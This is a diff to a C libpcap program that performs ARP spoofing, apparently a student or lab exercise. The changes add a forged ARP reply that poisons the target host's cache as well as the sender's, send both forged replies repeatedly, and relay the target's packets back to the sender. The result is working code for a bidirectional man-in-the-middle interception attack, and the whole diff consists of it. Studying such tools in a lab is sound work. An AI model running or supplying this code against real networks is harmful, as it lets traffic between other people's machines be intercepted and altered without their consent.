@@ -105,12 +105,12 @@ int main(int argc, char** argv)
         {
             printf("[MainThread] pcap_next_ex failed.. Program will be retry on this function.\n");
         }
-    }while(!memcmp(shareData.senderMAC, NULL_MAC, 6) ||
-           !memcmp(shareData.targetMAC, NULL_MAC, 6));
+    }while(!memcmp(shareData.senderMAC, NULL_MAC, ETHER_ADDR_LEN) ||
+           !memcmp(shareData.targetMAC, NULL_MAC, ETHER_ADDR_LEN));
     pcap_close(pktDescriptor);
 
     pthread_create(&threadID[0], NULL, thread_arp_processor, interface);
-    sleep(1); // Main thread must be sleep
+    sleep(3); // Main thread must be sleep
     pthread_create(&threadID[1], NULL, thread_relay_processor, interface);
     pthread_join(&threadID[0], (void*)&threadStatus);
     pthread_join(&threadID[1], (void*)&threadStatus);
@@ -140,8 +140,19 @@ void* thread_arp_processor(char* interface)
         SIMPLE_LOCALHOST_MAC, htonl(shareData.targetIP),
         NULL_MAC, htonl(shareData.senderIP)
     };
+    ETH_ARP repSpoofTarget = {
+        NULL_MAC,
+        SIMPLE_LOCALHOST_MAC,
+        htons(ETHERTYPE_ARP),
+        htons(ARPHRD_ETHER),htons(ETHERTYPE_IP),
+        ETHER_ADDR_LEN,NET_IP_LEN,htons(ARPOP_REPLY),
+        SIMPLE_LOCALHOST_MAC, htonl(shareData.senderIP),
+        NULL_MAC, htonl(shareData.targetIP)
+    };
     memcpy(repSpoof.ethHeader._802_3_dhost, shareData.senderMAC, ETHER_ADDR_LEN);
     memcpy(repSpoof.arpHeader.dstMAC, shareData.senderMAC, ETHER_ADDR_LEN);
+    memcpy(repSpoofTarget.ethHeader._802_3_dhost, shareData.targetMAC, ETHER_ADDR_LEN);
+    memcpy(repSpoofTarget.arpHeader.dstMAC, shareData.targetMAC, ETHER_ADDR_LEN);
     while(1)
     {
         timer += clock();
@@ -158,11 +169,13 @@ void* thread_arp_processor(char* interface)
                     {
                         sleep(1); // wait arp load
                         pcap_sendpacket(pktDescriptor, (uint8_t*)(&repSpoof), sizeof(ETH_ARP));
+                        pcap_sendpacket(pktDescriptor, (uint8_t*)(&repSpoofTarget), sizeof(ETH_ARP));
                     }
                     if ((!memcmp(ethHeader->_802_3_shost, shareData.targetMAC, ETHER_ADDR_LEN)) &&
                             (ntohl(arpHeader->dstIP) == shareData.targetIP))
                     {
                         pcap_sendpacket(pktDescriptor, (uint8_t*)(&repSpoof), sizeof(ETH_ARP));
+                        pcap_sendpacket(pktDescriptor, (uint8_t*)(&repSpoofTarget), sizeof(ETH_ARP));
                     }
                 }
             }
@@ -170,6 +183,7 @@ void* thread_arp_processor(char* interface)
         if (timer >= 3000)
         {
             pcap_sendpacket(pktDescriptor, (uint8_t*)(&repSpoof), sizeof(ETH_ARP));
+            pcap_sendpacket(pktDescriptor, (uint8_t*)(&repSpoofTarget), sizeof(ETH_ARP));
             timer = 0;
         }
         sleep(1);
@@ -205,6 +219,13 @@ void* thread_relay_processor(char* interface)
                 {
                     memcpy(ethHeader->_802_3_dhost, shareData.targetMAC, ETHER_ADDR_LEN);
                     memcpy(ethHeader->_802_3_shost, shareData.localhostMAC, ETHER_ADDR_LEN);
+                    pcap_sendpacket(pktDescriptor, readedData, pktData->len);
+                }
+                if (!memcmp(ethHeader->_802_3_shost, shareData.targetMAC, ETHER_ADDR_LEN) &&
+                    !memcmp(ethHeader->_802_3_dhost, shareData.localhostMAC, ETHER_ADDR_LEN) &&
+                    (ntohl(ipHeader->ip_dst.s_addr) != shareData.senderIP) )
+                {
+                    memcpy(ethHeader->_802_3_dhost, shareData.senderMAC, ETHER_ADDR_LEN);
                     pcap_sendpacket(pktDescriptor, readedData, pktData->len);
                 }
             }
